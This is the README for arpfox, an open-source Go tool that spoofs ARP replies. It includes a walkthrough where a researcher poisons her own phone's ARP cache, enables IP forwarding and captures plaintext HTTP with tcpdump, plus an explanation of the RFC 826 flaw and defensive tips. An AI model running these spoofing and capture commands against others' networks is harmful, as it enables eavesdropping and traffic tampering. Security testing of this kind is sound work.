# arpfox

`arpfox` is an [arpspoof](http://linux.die.net/man/8/arpspoof) clone written in
Go which creates and injects special [ARP
packets](https://en.wikipedia.org/wiki/Address_Resolution_Protocol#Packet_structure)
that can be used to poison
[ARP](https://en.wikipedia.org/wiki/Address_Resolution_Protocol) cache tables.

A security researcher can run `arpfox` against any machine on the LAN to pose
as any other host, this is an ancient technique known as [ARP
spoofing](https://en.wikipedia.org/wiki/ARP_spoofing) and is commonly used to
eavesdrop communications on a LAN.

The machine that receives traffic can record, censor, alter or selectively drop
network packets that pass through it.

## Building

Requisites:

```
sudo dnf install -y libpcap-devel
```

```
go get github.com/xiam/arpfox
arpfox -h
```

## Running

Depending on your OS, you may require root privileges to run this command:

```
arpfox -i wlan0 -t 10.0.0.25 10.0.0.1
2016/09/05 20:06:12 wlan0: You don't have permission to capture on that device ((cannot open device) /dev/bpf: Permission denied)

sudo arpfox -i wlan0 -t 10.0.0.25 10.0.0.1
...
```

## A practical example

Alice is a security researcher, and she's going to redirect and watch traffic
coming from her own phone on her machine in order in order to test if the phone
and if a local network are susceptible to ARP spoofing.

Alice's machine is already on the same LAN as the phone, and she knows the IP
addresses of both the phone and of the router.

```
Router: 10.0.0.1
Phone: 10.0.0.101
```

Alice will attempt to make her machine pose as the router in order for the
phone to send all traffic to it.

If she succeeds, the phone will start sending traffic marked for `10.0.0.1` to
Alice's machine, which will just ignore the packets because these packets have
a different destination. In order to instruct the machine to forward the
packets to the legitimate destination instrad of dropping them, Alice does
something like:

```
# OSX
sudo sysctl -w net.ipv4.ip_forward=1

# FreeBSD
sudo sysctl -w net.inet.ip.forwarding=1

# Linux
sudo sysctl -w net.ipv4.ip_forward=1
```

And besides forwarding, Alice also wants to see what's going on with
unencrypted traffic, so she instructs `tcpdump` to display packets coming from
the phone:

```
tcpdump -i en0 -A -n "src host 10.0.0.101 and (dst port 80 or dst port 443)"
```

At this point, the phone's ARP table looks like this:

```
# 10.0.0.1's legitimate MAC address on the phone.
? (10.0.0.1) at 11:22:33:44:55:66 on wlan0 expires in 857 seconds [ethernet]
```

and she's prepared to use `arpfox`:

```
# arpfox -i [network interface] -t [target] [host]
arpfox -i en0 -t 10.0.0.101 10.0.0.1
```

`-t 10.0.0.101 10.0.0.1` tells `arpfox` to send unsolicited ARP replies to the
phone (`10.0.0.101`) posing as the router (`10.0.0.1`).

After a few seconds, the phone's ARP table gets altered and the phone now
thinks Alice's machine is the router:

```
# 10.0.0.1's MAC address was changed on the phone.
? (10.0.0.1) at 11:22:de:ad:be:ef on wlan0 expires in 1193 seconds [ethernet]
```

Finally, she takes the phone and goes to `example.com`, `tcpdump` starts
showing traffic:

```
...
GET / HTTP/1.1
Host: example.org
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_5 like Mac OS X) AppleWebKit/601.1 (KHTML, like Gecko) CriOS/52.0.2743.84 Mobile/13G36 Safari/601.1.46
Accept-Language: en-us
Cache-Control: max-age=0
Connection: keep-alive
...
```

## Why does this happen?

[ARP](https://en.wikipedia.org/wiki/Address_Resolution_Protocol) is the
protocol most computer use to translate a [MAC
address](https://en.wikipedia.org/wiki/MAC_address) into an [IP address
](https://en.wikipedia.org/wiki/IP_address). The original proposal is described
in [RFC826](https://tools.ietf.org/html/rfc826).

The part that is flawed is described in the "Packet Reception" section:

> Notice that the <protocol type, sender protocol address, sender
> hardware address> triplet is merged into the table before the
> opcode is looked at.  This is on the assumption that communcation
> is bidirectional; if A has some reason to talk to B, then B will
> probably have some reason to talk to A.  Notice also that if an
> entry already exists for the <protocol type, sender protocol
> address> pair, then the new hardware address supersedes the old
> one.  Related Issues gives some motivation for this.

The opcode they're talking about is what tells if the packet is a request or a
reply, nothing verifies that a reply is associated with a request nor that a
request was made in the first place.

It only takes an unsolicited ARP packet of type reply to make a device change
it's ARP table, this includes adding new addreses and replacing old ones.

## How can I protect against this?

There are [some programs](https://en.wikipedia.org/wiki/ARP_spoofing#Defense)
that can help you against ARP spoofing. Sometimes programs like these may be
inconvenient because we usually roam over different networks all the time and
these programs require usto hack stuff before actually starting being
productive. Keeping an static ARP table is simply not practical enough for most
users.

One thing you can do, though, is assuming things like these could happen and
try to encrypt your communications, specially on untrusted networks where any
node, even the router, can be actively recording traffic without your consent.
While this doesn't prevent attackers from keeping records on your
communications, it does prevent them from knowing the actual contents of it.

You don't have to use a VPN to stay secure, you can build a proxy with SSH and
configure your programs to use it:

```
ssh -D 9999 user@myownserver.org
```

A more advanced example could be found
[here](https://www.digitalocean.com/community/tutorials/how-to-route-web-traffic-securely-without-a-vpn-using-a-socks-tunnel).
